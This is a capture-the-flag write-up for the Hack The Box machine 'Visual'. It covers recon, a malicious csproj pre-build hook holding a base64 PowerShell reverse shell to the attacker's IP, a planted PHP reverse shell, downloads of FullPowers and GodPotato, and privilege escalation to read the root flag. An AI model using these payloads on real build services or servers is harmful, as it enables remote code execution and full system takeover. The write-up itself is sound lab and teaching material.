# Recon:



Adding the domain name to /etc/hosts
```
sudo echo "10.10.11.234 visual.htb" >> /etc/hosts
```


Nmap:

```
kali> sudo nmap -p- --open -sVC --min-rate 5000 10.10.11.234 -oN scan

PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 26.73 seconds
```

Whatweb:

[http://10.10.11.234](http://10.10.11.234) [200 OK] Apache[2.4.56], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17], IP[10.10.11.234], OpenSSL[1.1.1t], PHP[8.1.17], Script, Title[Visual - Revolutionizing Visual Studio Builds], X-Powered-By[PHP/8.1.17]

Conclussions:
- Is a windows machine
- The machine runs an apache web server
- This site uses a PHP  application

The website:

```
Experience a revolutionary approach to Visual Studio project compilation with Visual. Say goodbye to the frustrations of build issues on your machine. Simply provide us with your Git Repo link, and we'll handle the rest. Our cutting-edge technology compiles your projects and sends back the executable or DLL files you need, effortlessly and efficiently.

We currently support .NET 6.0 and C# programs, so make sure your Git Repo includes a .sln file for successful compilation. Trust Visual to simplify and streamline your project compilation process like never before.
```

On this site we can upload a git repository and compile it on this website. I did some tests and I retrieve an error message from the site

```
[-] The repository doesn't contain a .sln file or the URL submitted is invalid.
```

What is an sln file ?
```
What is SLN file? A file with . SLN extension represents **a Visual Studio solution file that keeps information about the organization of projects in a solution file**. The contents of such a solution file are written in plain text inside the file and can be observed/edited by opening the file in any text editor.
```

Right now I had to create a valid repository. I used dotnet there is another possibility to do it with gitea.



This site explains how to create the repository with dotnet
https://learn.microsoft.com/en-us/dotnet/core/tools/global-tools-how-to-create


This info was usefull to, regarding to git . How to clone the repository and upload it to the website
https://theartofmachinery.com/2016/07/02/git_over_http.html



So at this point  I did this commands on this order.


Create the repository that I need to work with dotnet
```
mkdir visual
```

Then I went inside the folder
```
cd visual
```

Now , I created another repository , initializing git inside of it
```
git init visual-htb
```

Then i started a program with dotnet
```
dotnet new console --framework net6.0 --use-program-main
```

I created the sln file
```
dotnet new sln --name visual-htb
```

Now creating the csproj file
```
dotnet sln add visual-htb.csproj
```

Then I build it (just to see what happens)
```
dotnet build
```

This is necesary, I deleted the bin created folder on the build command
```
delete bin 
```

Now this is neccesary to do the commits
```
git add .

git commit -m "first-commit"
```

Now clonning and getting inside of the cloned folder, and there starting other commands
```
git --bare clone visual-htb visual-clone

cd visual-clone/.git

git --bare update-server-info

mv hooks/post-update.sample hooks/post-update
```

Here we start the python server 
```
pwd: /Visual/visual-clone/.git

python3 -m http.server
```


Now, when I upload the repository is necessary to refer to this python server that I just created

```
 --------------------------
|  Upload your repository  | --->  http://<yourip>:8000/ 
 --------------------------
```


Now, the vulnerability resides on the pre or post build 

And this is something about to trigger different commands after and before compiling the repository on the website
https://learn.microsoft.com/en-us/visualstudio/ide/reference/build-events-page-project-designer-csharp?view=vs-2022



First I did a test, to see if I was able to execute commands

```
<Project Sdk="Microsoft.NET.Sdk">

 <PropertyGroup>
 
  <OutputType>Exe</OutputType>
  <TargetFramework>net6.0</TargetFramework>
  <RootNamespace>visual_htb</RootNamespace>
  <ImplicitUsings>enable</ImplicitUsings>
  <Nullable>enable</Nullable>
  
 </PropertyGroup>

(you can use pre or post build)
<Target Name="PreBuild" AfterTargets="PreBuildEvent">
<Exec Command="powershell.exe -Command Invoke-WebRequest -Uri   &quot;http://10.10.16.86:8000/test&quot -Outfile &quot; test.txt&quot;" />
</Target>

</Project>
```

If is vulnerable you will se a petition to  "/test"  on the python server after or before the website start to compile the git repository. 

Now that I know that is vulnerable I created my reverse shell

First I listen with netcat on my terminal, I use sudo and the port 443 because is more probable get the shell because is a common port and probably the firewall don't pay attention to it. Other ports like 4444 or 5555 are very used for purposes like reverse shells, they are already know.

```
kali> sudo nc -nlvp 443
```



To get a reverse shell I need to modify my csproj file and put inside of it this :

```
<Project Sdk="Microsoft.NET.Sdk">

 <PropertyGroup>
 
  <OutputType>Exe</OutputType>
  <TargetFramework>net6.0</TargetFramework>
  <RootNamespace>visual_htb</RootNamespace>
  <ImplicitUsings>enable</ImplicitUsings>
  <Nullable>enable</Nullable>
  
 </PropertyGroup>

(you can use pre or post build)
<Target Name="PreBuild" AfterTargets="PreBuildEvent">
<Exec Command="powershell.exe powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA= />
</Target>

</Project>
```


As you can see my shell is on base64 encoding, you can create yours here:
 [https://www.revshells.com/](https://www.revshells.com/)

# User and root:

Now I was able to cat the user flag

```
PS C:\Windows\Temp\88378c81090d6e1bbfd0cad5709f28> whoami

visual\enox

```

I did the enumeration by myself because when I used Winpeas I lost the shell. (You can investigate how to put files on the victim machine by yourself)

I did a manual enumeration of the system:

```
systeminfo:

Host Name: VISUAL
OS Name: Microsoft Windows Server 2019 Standard
OS Version: 10.0.17763 N/A Build 17763
OS Manufacturer: Microsoft Corporation
OS Configuration: Standalone Server
OS Build Type: Multiprocessor Free
Registered Owner: Windows User
Registered Organization:
Product ID: 00429-00521-62775-AA642
Original Install Date: 6/10/2023, 10:08:12 AM
System Boot Time: 10/29/2023, 4:05:17 PM
System Manufacturer: VMware, Inc.
System Model: VMware7,1
System Type: x64-based PC
Processor(s): 2 Processor(s) Installed.
[01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
[02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version: VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory: C:\Windows
System Directory: C:\Windows\system32
Boot Device: \Device\HarddiskVolume2
System Locale: en-us;English (United States)
Input Locale: en-us;English (United States)
Time Zone: (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory: 4,095 MB
Available Physical Memory: 3,100 MB
Virtual Memory: Max Size: 4,799 MB
Virtual Memory: Available: 3,883 MB
Virtual Memory: In Use: 916 MB
Page File Location(s): C:\pagefile.sys
Domain: WORKGROUP
Logon Server: N/A
Hotfix(s): N/A
Network Card(s): 1 NIC(s) Installed.
[01]: vmxnet3 Ethernet Adapter
Connection Name: Ethernet0 2
DHCP Enabled: No
IP address(es)
[01]: 10.10.11.234
Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed.



whoami /groups
GROUP INFORMATION

-----------------

Group Name Type SID Attributes

==================================== ================ ============ ==================================================

Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group

BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group

CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group

LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group

Mandatory Label\High Mandatory Level Label S-1-16-12288




C:\Users> netstat -ano

Active Connections

Proto Local Address Foreign Address State PID
TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 2212
TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 864
TCP 0.0.0.0:443 0.0.0.0:0 LISTENING 2212
TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4
TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4
TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4
TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 472
TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 1052
TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 1520
TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 608
TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 616
TCP 10.10.11.234:139 0.0.0.0:0 LISTENING 4
TCP 10.10.11.234:49725 10.10.16.86:443 ESTABLISHED 1600
TCP [::]:80 [::]:0 LISTENING 2212
TCP [::]:135 [::]:0 LISTENING 864
TCP [::]:443 [::]:0 LISTENING 2212
TCP [::]:445 [::]:0 LISTENING 4
TCP [::]:5985 [::]:0 LISTENING 4
TCP [::]:47001 [::]:0 LISTENING 4
TCP [::]:49664 [::]:0 LISTENING 472
TCP [::]:49665 [::]:0 LISTENING 1052
TCP [::]:49666 [::]:0 LISTENING 1520
TCP [::]:49667 [::]:0 LISTENING 608
TCP [::]:49668 [::]:0 LISTENING 616
UDP 0.0.0.0:123 *:* 2396
UDP 0.0.0.0:5353 *:* 1576
UDP 0.0.0.0:5355 *:* 1576
UDP 10.10.11.234:137 *:* 4
UDP 10.10.11.234:138 *:* 4
UDP 127.0.0.1:63506 *:* 2740
UDP [::]:123 *:* 2396


Firewall status:
-------------------------------------------------------------------
Profile = Standard
Operational mode = Enable
Exception mode = Enable
Multicast/broadcast response mode = Enable
Notification mode = Disable
Group policy version = Windows Defender Firewall
Remote admin mode = Disable
Ports currently open on all network interfaces:
Port Protocol Version Program

-------------------------------------------------------------------
```


This catch my attention, at the start I tried to find some username or credentials but It was a rabbit hole.

```
PS C:\xampp
```

Typically, web and database services possess "ImpersonatePrivilege" permissions. These permissions can potentially be exploited to escalate privileges. I had to get a reverse shell and exploit this service.


To do this I see that I have permisions to write on the site folder ( see it with ICACLS). Then I put a reverse PHP shell on the uploads folder.

`( First I did a python server with the file and I downloaded to the uploads foder )`

Uploading the reverse shell
```
Invoke-WebRequest -Uri http://10.10.16.86:80/revshell.php -OutFile C:\xampp\htdocs\uploads\revshell.php
```

So listen I start to listen on netcat
`sudo nc -nlvp 444 `

And this is the command to trigger the reverse shell , Is posible even do it with the browser

```
curl http://visual.htb/uploads/revshell.php
```


The impersonation privilege wasnt there
```
C:\xampp\htdocs\uploads>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To recover the default privileges of the system local services like this there is a tool called "full powers" . So I uploaded the full powers to the victim machine and I executed it
https://github.com/itm4n/FullPowers 


Uploading the file

```
powershell Invoke-WebRequest -Uri http://10.10.16.86:80/FullPowers.exe -OutFile FullPowers.exe
```

I execute full powers

`C:\fullpowers`

Then i see my privileges

```
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

Finally I did my impersonation privilege scalation with godpotato:

First uploading the file

```
`powershell Invoke-WebRequest -Uri http://10.10.16.86:80/GodPotato-NET4.exe -OutFile` GodPotato-NET4.exe
```


FInally reading the root flag

```
`GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"`
```